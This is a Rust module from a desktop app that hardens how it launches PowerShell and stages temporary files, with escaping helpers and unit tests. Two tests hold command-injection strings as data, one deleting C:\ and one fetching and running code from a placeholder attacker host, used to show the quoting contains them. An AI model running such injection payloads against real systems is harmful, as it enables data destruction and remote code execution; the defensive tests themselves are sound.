//! Locating the operating system's own programs, and staging files for them.
//!
//! Two precautions live here rather than at each call site, because getting
//! either of them wrong is a security bug rather than an ordinary one.
//!
//! **Programs are named by absolute path.** A bare `Command::new("powershell.exe")`
//! is resolved by `CreateProcessW`, whose search order starts with the directory
//! the running executable is in and, depending on how the process was started,
//! can include the current directory — both of which an attacker may be able to
//! write to when the app has been unzipped into Downloads. Whoever wins that
//! search decides what "PowerShell" means, and one of the things this app asks
//! PowerShell to do is handle the ElevenLabs API key in plaintext. The macOS
//! side already spells out `/usr/bin/say` and `/usr/bin/sips`; this is the same
//! discipline for Windows.
//!
//! **Scratch files are created exclusively.** The app stages a document, or a
//! converted image, in the temporary directory. Creating those with a plain
//! write means following whatever is already at that path — including a symlink
//! an attacker planted, pointing somewhere it should not be able to write. The
//! per-user temp directory both platforms default to makes that hard already,
//! but `TMPDIR` is an environment variable and the cost of not relying on it is
//! one flag.

use anyhow::{Context, Result};
use std::fs::File;
use std::path::PathBuf;
use std::sync::atomic::{AtomicU64, Ordering};

/// Makes each name in a process unique even inside one clock tick.
static SEQUENCE: AtomicU64 = AtomicU64::new(0);

/// Creates a new, empty, private file in the temporary directory and returns it
/// with its path.
///
/// `create_new` is the point: it fails rather than following a symlink or
/// truncating a file that is already there, so a name an attacker guessed and
/// pre-created is an error instead of a write to somewhere else. On Unix the
/// mode makes it readable only by its owner, since what gets staged is the
/// user's document.
pub fn create_scratch_file(prefix: &str, extension: &str) -> Result<(File, PathBuf)> {
    let directory = std::env::temp_dir();
    let mut collision = None;

    // A handful of attempts, because the only expected failure is two files
    // landing on the same nanosecond; anything else is reported as-is.
    for _ in 0..8 {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|since| since.as_nanos())
            .unwrap_or_default();
        let path = directory.join(format!(
            "{prefix}-{}-{nanos}-{}.{extension}",
            std::process::id(),
            SEQUENCE.fetch_add(1, Ordering::Relaxed)
        ));

        let mut options = std::fs::OpenOptions::new();
        options.write(true).create_new(true);
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt as _;
            options.mode(0o600);
        }

        match options.open(&path) {
            Ok(file) => return Ok((file, path)),
            Err(error) if error.kind() == std::io::ErrorKind::AlreadyExists => {
                collision = Some(error);
            }
            Err(error) => {
                return Err(error).with_context(|| format!("could not create {}", path.display()));
            }
        }
    }

    Err(collision.expect("the loop only exits here after a collision"))
        .context("could not create a temporary file with a free name")
}

/// The absolute path of a program in the Windows system directory.
///
/// `SystemRoot` is set by the kernel for every process and cannot be inherited
/// from a parent that made it up, but it is read through `PathBuf` rather than
/// trusted as a string; the fallback is the install location Windows has used
/// since NT.
#[cfg(target_os = "windows")]
pub fn system32(program: &str) -> PathBuf {
    let root = std::env::var_os("SystemRoot")
        .map(PathBuf::from)
        .filter(|path| path.is_absolute())
        .unwrap_or_else(|| PathBuf::from(r"C:\Windows"));
    root.join("System32").join(program)
}

/// A PowerShell invocation that runs `script`, with no profile, no window, and
/// no dependence on `PATH`.
///
/// The script is handed over as `-EncodedCommand` — base64 of UTF-16LE — which
/// sidesteps `cmd`'s quoting rules completely: there is no layer between here
/// and PowerShell that could reinterpret a character in the script.
#[cfg(target_os = "windows")]
pub fn powershell(script: &str) -> std::process::Command {
    use base64::Engine as _;
    use base64::engine::general_purpose::STANDARD as BASE64;
    use std::os::windows::process::CommandExt as _;

    /// Keeps a console window from flashing up behind the GUI.
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;

    let utf16: Vec<u8> = script.encode_utf16().flat_map(u16::to_le_bytes).collect();
    let mut command =
        std::process::Command::new(system32(r"WindowsPowerShell\v1.0\powershell.exe"));
    command
        .args([
            "-NoProfile",
            "-NonInteractive",
            // Applies to the encoded script supplied right here, which is this
            // binary's own text — not to anything on disk.
            "-ExecutionPolicy",
            "Bypass",
            "-EncodedCommand",
        ])
        .arg(BASE64.encode(utf16))
        .creation_flags(CREATE_NO_WINDOW);
    command
}

/// Escapes a value for a PowerShell single-quoted string, where the only
/// special character is the quote itself, doubled. A literal newline does not
/// end such a string, so text needs no other treatment.
///
/// Shared so the two callers cannot drift: everything interpolated into a
/// generated script — paths, voice names — goes through this.
///
/// Compiled on every platform rather than only Windows, so the tests below run
/// everywhere. Escaping is the kind of code that should not be exercised on one
/// operating system only.
#[cfg_attr(not(target_os = "windows"), allow(dead_code))]
pub fn ps_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', "''"))
}

/// Held for the duration of any test that launches a real `powershell.exe`.
///
/// `cargo test` runs tests in parallel, and several tests in this crate do
/// that. Windows PowerShell 5.1's own module loading is not safe against
/// several of its own processes doing that at once: this app has
/// independently hit both `CouldNotAutoloadMatchingModule` (autoloading a
/// command's module races a shared, on-disk module-analysis cache) and a
/// `TypeData ... already present` failure (from working around the first by
/// importing the module explicitly) on the same CI runner, from the same
/// handful of tests launching close together. Neither is a bug in the script
/// being tested — production code never launches PowerShell concurrently
/// with itself — so the fix belongs here, serialising the tests, rather than
/// in the scripts.
///
/// Not gated to `target_os = "windows"`: the macOS system-voice tests share
/// this lock too, purely so `renders_real_speech_to_wav_and_mp3` and
/// `speaking_spawns_a_killable_process` — which are `cfg`'d to run on both
/// platforms — don't need a second, platform-specific code path. There is no
/// evidence macOS's `say`/`security` need it; the lock is just as free to
/// take as to skip.
#[cfg(test)]
pub(crate) fn serialize_powershell_tests() -> std::sync::MutexGuard<'static, ()> {
    static LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
    LOCK.lock()
        .unwrap_or_else(std::sync::PoisonError::into_inner)
}

#[cfg(test)]
mod tests {
    use super::{create_scratch_file, ps_quote};

    #[test]
    fn ps_quote_doubles_embedded_quotes() {
        assert_eq!(ps_quote(r"C:\Users\Jo\out.wav"), r"'C:\Users\Jo\out.wav'");
        // The one character that could end the string early.
        assert_eq!(ps_quote("it's"), "'it''s'");
        assert_eq!(
            ps_quote("'; Remove-Item C:\\ ;'"),
            "'''; Remove-Item C:\\ ;'''"
        );
    }

    /// A quoted value must never be able to end its string and start a new
    /// statement — the whole reason paths and voice names go through it.
    #[test]
    fn ps_quote_contains_an_attempted_escape() {
        let hostile = "'; Invoke-WebRequest evil.example/x | iex; $x='";
        let quoted = ps_quote(hostile);

        assert!(quoted.starts_with('\'') && quoted.ends_with('\''));
        // Every quote in the interior is doubled, so none of them closes the
        // string: the count of consecutive quotes is always even inside.
        let interior = &quoted[1..quoted.len() - 1];
        for run in interior.split(|c| c != '\'').filter(|r| !r.is_empty()) {
            assert!(run.len().is_multiple_of(2), "a lone quote escaped: {run:?}");
        }
    }

    #[test]
    fn scratch_files_are_new_each_time_and_never_collide() {
        let (_a, first) = create_scratch_file("accessengine-test", "tmp").unwrap();
        let (_b, second) = create_scratch_file("accessengine-test", "tmp").unwrap();
        assert_ne!(first, second);
        assert!(first.exists() && second.exists());
        std::fs::remove_file(&first).ok();
        std::fs::remove_file(&second).ok();
    }

    /// The property the whole function exists for: a name that is already taken
    /// is refused rather than followed or overwritten.
    #[test]
    fn an_existing_path_is_never_opened() {
        let (_file, path) = create_scratch_file("accessengine-exclusive", "tmp").unwrap();
        std::fs::write(&path, b"important").unwrap();

        let mut options = std::fs::OpenOptions::new();
        options.write(true).create_new(true);
        let refused = options.open(&path);
        assert_eq!(
            refused.unwrap_err().kind(),
            std::io::ErrorKind::AlreadyExists
        );

        // And the loop above hands back a different name rather than that one.
        let (_next, other) = create_scratch_file("accessengine-exclusive", "tmp").unwrap();
        assert_ne!(other, path);
        assert_eq!(std::fs::read(&path).unwrap(), b"important");

        std::fs::remove_file(&path).ok();
        std::fs::remove_file(&other).ok();
    }

    #[test]
    #[cfg(unix)]
    fn scratch_files_are_readable_only_by_their_owner() {
        use std::os::unix::fs::PermissionsExt as _;

        let (_file, path) = create_scratch_file("accessengine-mode", "tmp").unwrap();
        let mode = std::fs::metadata(&path).unwrap().permissions().mode();
        std::fs::remove_file(&path).ok();
        assert_eq!(
            mode & 0o777,
            0o600,
            "staged text was left group/world readable"
        );
    }

    #[test]
    #[cfg(target_os = "windows")]
    fn system_programs_are_absolute_paths_not_bare_names() {
        let path = super::system32("where.exe");
        assert!(path.is_absolute(), "{} is not absolute", path.display());
        assert!(path.ends_with(r"System32\where.exe"));
    }
}
